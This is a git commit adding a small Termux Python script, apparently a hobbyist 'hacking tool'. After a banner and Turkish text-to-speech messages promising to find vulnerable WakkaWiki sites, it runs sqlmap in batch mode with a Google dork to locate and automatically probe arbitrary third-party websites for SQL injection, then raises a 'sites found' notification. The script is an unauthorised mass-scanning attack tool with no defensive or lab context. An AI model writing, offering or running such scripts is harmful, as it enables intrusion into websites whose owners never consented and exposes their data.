ce9ea18c07a457849779b53893ea2ae93aa6aa82
saepsh <81823910+saepsh@users.noreply.github.com>
2021-11-25 00:29:58 +0300

    Add files via upload

---
+++ tool.py
@@ -0,0 +1,23 @@
+import os
+import time
+
+os.system("apt install git")
+os.system("apt install python python2 -y")
+os.system("pkg install termux-api")
+os.system("clear")
+print("""
+\033[96m
+ ██████╗ █████╗ ███████╗██████╗
+██╔════╝██╔══██╗██╔════╝██╔══██╗
+╚█████╗ ███████║█████╗  ██████╔╝
+ ╚═══██╗██╔══██║██╔══╝  ██╔═══╝
+██████╔╝██║  ██║███████╗██║
+╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝
+""")
+
+os.system("termux-tts-speak -l tr Merhaba ben saepin tooluyum senin için wakka wiki açıklı siteler bulacağım")
+os.system("termux-tts-speak -l tr siteler bulununca sana bildirim yollayacağım")
+os.chdir("/data/data/com.termux/files/home/sqlmap/")
+os.system("python2 sqlmap.py -g inurl:?PagePrincipale --batch")
+time.sleep(40)
+os.system("termux-notification -t Siteler bulundu")
